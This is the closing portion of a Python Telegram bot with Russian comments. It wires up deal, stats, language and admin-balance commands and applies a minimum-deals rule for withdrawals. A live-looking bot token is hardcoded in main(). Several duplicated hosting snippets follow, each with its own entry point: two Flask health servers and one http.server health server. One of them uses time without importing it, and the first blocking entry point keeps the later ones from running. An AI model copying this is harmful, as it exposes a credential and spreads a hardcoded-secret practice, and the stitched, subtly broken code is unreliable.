        else:
            await send_main_menu_with_photo(update.message.chat_id, context)
    except Exception as e:
        logger.error(f"Ошибка в handle_message: {e}")
        await update.message.reply_text("Произошла ошибка. Пожалуйста, попробуйте еще раз.")


# ------------------ ОБРАБОТЧИК НЕИЗВЕСТНЫХ КОМАНД ------------------
async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if update.message:
        await send_main_menu_with_photo(update.message.chat_id, context)


# ------------------ ОБРАБОТЧИК ОШИБОК ------------------
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Ошибка при обработке обновления {update}: {context.error}")


# ------------------ ОСНОВНАЯ ФУНКЦИЯ ------------------
def main():
    try:
        print("🔄 Запуск бота...")
        print("✅ Добавлена поддержка двух языков (русский/английский) с выбором при старте")
        print(f"📊 Для вывода необходимо {MIN_DEALS_FOR_WITHDRAWAL} успешных сделок (кроме новых пользователей)")
        application = Application.builder().token("8365274638:AAGXMYTAVzH8V-ymffpHh1sgggifDtYoQeg").build()

        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("buy", buy_command))
        application.add_handler(CommandHandler("set_my_deals", set_my_deals_command))
        application.add_handler(CommandHandler("my_stats", my_stats_command))
        application.add_handler(CommandHandler("language", language_command))

        application.add_handler(CommandHandler("add_user", add_user_command))
        application.add_handler(CommandHandler("remove_user", remove_user_command))
        application.add_handler(CommandHandler("list_users", list_users_command))
        application.add_handler(CommandHandler("admin_balance", admin_balance_command))

        application.add_handler(MessageHandler(filters.COMMAND, unknown_command))
        application.add_handler(CallbackQueryHandler(handle_callback_query))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

        application.add_error_handler(error_handler)

        print("✅ Бот запущен успешно!")
        application.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)

    except Conflict as e:
        print("❌ ОШИБКА: Обнаружено несколько запущенных ботов! Завершите все процессы Python.")

    except Exception as e:
        logger.error(f"Критическая ошибка при запуске бота: {e}")
        print(f"❌ Критическая ошибка: {e}")



if __name__ == "__main__":
    main()
# ===== КОД ДЛЯ ХОСТА =====
from flask import Flask
import threading
import os
import sys
import traceback

app = Flask(__name__)

@app.route('/')
@app.route('/health')
def health():
    return "Bot is running", 200

def run_flask():
    port = int(os.environ.get('PORT', 8000))
    app.run(host='0.0.0.0', port=port)

def run_bot():
    try:
        main()  # запуск вашего бота
    except Exception as e:
        # Печатаем ошибку в stderr, чтобы она попала в логи Render
        print("❌ Ошибка в боте:", file=sys.stderr)
        traceback.print_exc(file=sys.stderr)
        # Не завершаем процесс, чтобы Render не перезапускал бесконечно
        while True:
            time.sleep(60)

if __name__ == "__main__":
    threading.Thread(target=run_flask).start()

    run_bot()

#НИЖЕ КОД ДЛЯ ХОСТИНГА 

import http.server
import socketserver
import threading
import os
import sys
import traceback
import time

class HealthCheckHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path == '/health':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Bot is running')
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        # Подавляем логи запросов, чтобы не засорять вывод
        pass

class ReusableTCPServer(socketserver.TCPServer):
    allow_reuse_address = True

def run_http_server():
    port = int(os.environ.get('PORT', 8000))
    handler = HealthCheckHandler
    time.sleep(1)
    try:
        with ReusableTCPServer(("", port), handler) as httpd:
            httpd.serve_forever()
    except OSError as e:
        print(f"❌ Не удалось запустить HTTP-сервер на порту {port}: {e}", file=sys.stderr)
        alt_port = port + 1
        print(f"Пробуем порт {alt_port}...", file=sys.stderr)
        with ReusableTCPServer(("", alt_port), handler) as httpd:
            httpd.serve_forever()

def run_bot():
    try:
        main()
    except Exception as e:
        print("❌ Ошибка в боте:", file=sys.stderr)
        traceback.print_exc(file=sys.stderr)
        while True:
            time.sleep(60)

if __name__ == "__main__":
    threading.Thread(target=run_http_server, daemon=True).start()
    run_bot()

# ===== КОД ДЛЯ ХОСТА =====
from flask import Flask
import threading
import os
import sys
import traceback

app = Flask(__name__)


@app.route('/')
@app.route('/health')
def health():
    return "Bot is running", 200

def run_flask():
    port = int(os.environ.get('PORT', 8000))
    app.run(host='0.0.0.0', port=port)

def run_bot():
    try:
        main()  # запуск вашего бота
    except Exception as e:
        # Печатаем ошибку в stderr, чтобы она попала в логи Render
        print("❌ Ошибка в боте:", file=sys.stderr)
        traceback.print_exc(file=sys.stderr)
        # Не завершаем процесс, чтобы Render не перезапускал бесконечно
        while True:
            time.sleep(60)

if __name__ == "__main__":

    threading.Thread(target=run_flask).start()
    run_bot()














